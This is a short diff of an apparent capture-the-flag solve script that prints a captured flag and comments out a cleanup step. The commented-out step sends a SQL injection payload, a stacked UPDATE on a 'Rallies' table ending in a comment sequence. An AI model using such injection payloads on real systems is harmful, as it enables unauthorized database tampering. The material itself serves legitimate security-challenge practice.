@@ -160,9 +160,9 @@ content = get_page(username).text
 print("Flag:", pattern.search(content).group())
 print("OK\n")
 
-# Undo injection to keep challenge fun for everyone
-print("> Reversing Injection")
-content = '\', 1); UPDATE "Rallies" SET "Hidden"=true WHERE "Id"=3; -- -'
-ok = send_injection(username, content)
-if not ok:
-    exit(1)
+# # Undo injection to keep challenge fun for everyone
+# print("> Reversing Injection")
+# content = '\', 1); UPDATE "Rallies" SET "Hidden"=true WHERE "Id"=3; -- -'
+# ok = send_injection(username, content)
+# if not ok:
+#     exit(1)
